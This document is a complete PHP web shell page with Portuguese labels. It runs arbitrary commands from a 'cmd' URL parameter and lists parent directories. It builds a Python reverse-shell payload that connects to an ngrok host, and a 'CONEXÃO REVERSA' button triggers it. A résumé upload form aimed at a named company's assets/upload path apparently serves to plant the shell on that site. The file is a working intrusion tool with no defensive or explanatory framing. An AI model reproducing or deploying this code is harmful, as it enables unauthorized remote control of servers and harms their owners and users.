<!DOCTYPE html>
<html lang="pt">
<head>
	<meta charset="UTF-8">
	<title>Shell - </title>
</head>

<style>
	body, p, a{
		background: #000;
		color: #fff;
		text-align: center;
		text-decoration: none;
	}

</style>


<body>

<h1>Shell </h1>



<?php if (empty($_GET["cmd"])){ ?>


	<div class="meio">
		<p>meu id =>
			<?php
				system(id);
			?>
		</p>

		<p>Listegem da primeira pasta <br>
			<?php
				echo "<pre>";
				system("cd ../;ls");
			?>
		</p>
		<br>
		<br>
		<br>
		<br>
		<br>

		<p>Listegem da primeira pasta 2 <br>
		<?php 
			echo "<pre>";
			system("cd ../../;ls");
		?>
		</p>
		<br>
		<br>
		<br>
		<br>
		<br>
	
		<p>Listegem da primeira pasta 3<br>
		<?php 
			echo "<pre>";
			system("cd ../../../;ls");
		?>
		</p>
		<br>
		<br>
		<br>
		<br>
		<br>

		<p>Listegem da primeira pasta 4<br>
		<?php 
			echo "<pre>";
			system("cd ../../../../;ls");
		?>
		</p>
		<br>
		<br>
		<br>
		<br>
		<br>
	</div>

<?php }
	else{
	  	echo "<pre>";
 		system($_GET["cmd"]);
	  	echo "<pre>";
 	}
 ?>

<?php

	$py = 'python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%220.tcp.ngrok.io%22,19448));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27'; 

	$url_atual = "http://$_SERVER[HTTP_HOST]?cmd=".$py."";
	echo $url_atual;
?>

<div class="meio">
<?php
 $urlteste = $url_atual;
		echo $urlteste;
?>

	<br><br><div onclick="location.href = '<?= $url_atual ?>';" >CONEXÃO REVERSA</div>
</div>

<form action="http://mitsubishi-modelo8.rewebmkt.com/themes/mitsubish-modelo8-homolog/assets/upload">
	<div class="form-group">
		<input name="arquivo" type="file" id="" placeholder="CURRÍCULO" class="form-control " data-custom-mask="" data-validation="" />
	</div>
	<button type="submit" class="btn-fill-little-radius">ENVIAR</button></div>
</form>
</body>
</html>

